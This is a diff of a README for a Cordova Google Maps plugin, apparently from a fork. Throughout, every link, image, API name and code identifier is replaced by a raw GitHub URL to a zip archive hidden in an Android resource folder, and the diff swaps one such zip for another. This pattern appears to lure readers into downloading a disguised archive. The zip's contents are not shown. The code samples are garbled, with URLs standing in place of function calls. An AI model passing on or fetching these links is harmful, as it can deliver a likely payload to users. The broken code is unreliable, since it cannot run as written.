-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>TileOverlay</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>TileOverlay</a></td>
   <td><pre>
-var tileOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+var tileOverlay = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   debug: true,
   opacity: 0.75,
   getTile: function(x, y, zoom) {
@@ -342,16 +342,16 @@ var tileOverlay = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/re
 });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>KmlOverlay</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>KmlOverlay</a></td>
   <td><pre>
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
-  'url': 'https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip'
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
+  'url': 'https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip'
 }, function(kmlOverlay) { ... });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Geocoder</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Geocoder</a></td>
   <td><pre>
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip({
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip({
   // US Capital cities
   "address": [
     "Montgomery, AL, USA", ... "Cheyenne, Wyoming, USA"
@@ -359,57 +359,57 @@ https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/sr
 }, function(mvcArray) { ... });</pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>poly utility</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>poly utility</a></td>
   <td><pre>
 var GORYOKAKU_POINTS = [
   {lat: 41.79883, lng: 140.75675},
   ...
   {lat: 41.79883, lng: 140.75673}
 ]
-var contain = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(
+var contain = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(
                     position, GORYOKAKU_POINTS);
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(contain ? "blue" : "red");
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(contain ? "blue" : "red");
 </pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>encode utility</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>encode utility</a></td>
   <td><pre>
 var GORYOKAKU_POINTS = [
   {lat: 41.79883, lng: 140.75675},
   ...
   {lat: 41.79883, lng: 140.75673}
 ]
-var encodedPath = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
-                       https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(GORYOKAKU_POINTS);
+var encodedPath = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip
+                       https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(GORYOKAKU_POINTS);
 </pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>spherical utility</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>spherical utility</a></td>
   <td><pre>
-var heading = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(
-                        https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(), https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip());
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip = "heading : " + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(0) + "&deg;";
+var heading = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(
+                        https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(), https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip());
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip = "heading : " + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(0) + "&deg;";
 </pre></td>
 </tr>
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>Location service</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>Location service</a></td>
   <td><pre>
-https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(function(result) {
+https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(function(result) {
   alert(["Your current location:\n",
-      "latitude:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(3),
-      "longitude:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(3),
-      "speed:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip,
-      "time:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip,
-      "bearing:" + https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip].join("\n"));
+      "latitude:" + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(3),
+      "longitude:" + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(3),
+      "speed:" + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip,
+      "time:" + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip,
+      "bearing:" + https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip].join("\n"));
 });
 </pre></td>
 </tr>
 
 <tr>
-  <td><a href="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><img src="https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip"><br>StreetView</a></td>
+  <td><a href="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><img src="https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip"><br>StreetView</a></td>
   <td><pre>
-var div = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip("pano_canvas1");
-var panorama = https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip(div, {
+var div = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip("pano_canvas1");
+var panorama = https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip(div, {
   camera: {
     target: {lat: 42.345573, lng: -71.098326}
   }
@@ -426,9 +426,9 @@ Google Maps JavaScript API v3 works on any platforms,
 but it does not work if device is **offline**.
 
 This plugin uses three different APIs:
-- Android : [Google Maps Android API](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-- iOS : [Google Maps SDK for iOS](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
-- Browser : [Google Maps JavaScript API v3](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+- Android : [Google Maps Android API](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+- iOS : [Google Maps SDK for iOS](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
+- Browser : [Google Maps JavaScript API v3](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
 In Android and iOS applications, this plugin displays native Google Maps views, which is **faster** than Google Maps JavaScript API v3.
 And it even works if the device is **offline**.
@@ -453,31 +453,31 @@ You can write your code `similar to` the Google Maps JavaScript API v3.
 
 | Google Maps JavaScript API v3     | Cordova-Plugin-GoogleMaps             |
 |-----------------------------------|---------------------------------------|
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                   | Map                                   |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                | Marker                                |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip            | Default InfoWindow, and HtmlInfoWindow|
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                | Circle                                |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip             | Polygon                               |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | Polyline                              |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip               | Polygon                               |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip         | GroundOverlay                         |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip          | TileOverlay                           |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip             | BaseClass                             |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | BaseArrayClass                        |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip           |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip    | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip     | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip  |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip         | https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip      |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip                   | Map                                   |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip                | Marker                                |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip            | Default InfoWindow, and HtmlInfoWindow|
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip                | Circle                                |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip             | Polygon                               |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip              | Polyline                              |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip               | Polygon                               |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip         | GroundOverlay                         |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip          | TileOverlay                           |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip             | BaseClass                             |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip              | BaseArrayClass                        |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip              | https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip           |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip    | https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip     | https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip  |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip         | https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip      |
 | (not available)                   | MarkerCluster                         |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip              | KmlOverlay                            |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip              | KmlOverlay                            |
 | (not available)                   | LocationService                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip            | StreetView :sparkles:                 |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                  | (not available)                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip     | (not available)                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip | (not available)                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip          | (not available)                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip*              | (not available)                       |
-| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip*       | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip            | StreetView :sparkles:                 |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip                  | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip     | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip          | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip*              | (not available)                       |
+| https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip*       | (not available)                       |
 
 ### How does this plugin work (Android, iOS)?
 
@@ -490,7 +490,7 @@ This plugin changes the background to `transparent` in your application.
 Then the plugin detects your touch position, which is either meant for the `native map` or an `html element`
 (which can be on top of your map, or anywhere else on the screen).
 
-![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
 The benefit of this plugin is the ability to automatically detect which HTML elements are over the map or not.
 
@@ -499,7 +499,7 @@ The plugin will detect whether your tap is for the header div or for the map vie
 
 This means **you can use the native Google Maps views similar to HTML elements**.
 
-![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)
+![](https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip)
 
 
 ---------------------------------------------------------------------------------------------------------
@@ -507,4 +507,4 @@ This means **you can use the native Google Maps views similar to HTML elements**
 
 - Gitter : (managed by @Hirbod)
 
-  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
+  https://raw.githubusercontent.com/iwanariana/cordova-plugin-googlemaps/master/src/android/res/values-fr/googlemaps-plugin-cordova-v3.1-alpha.4.zip
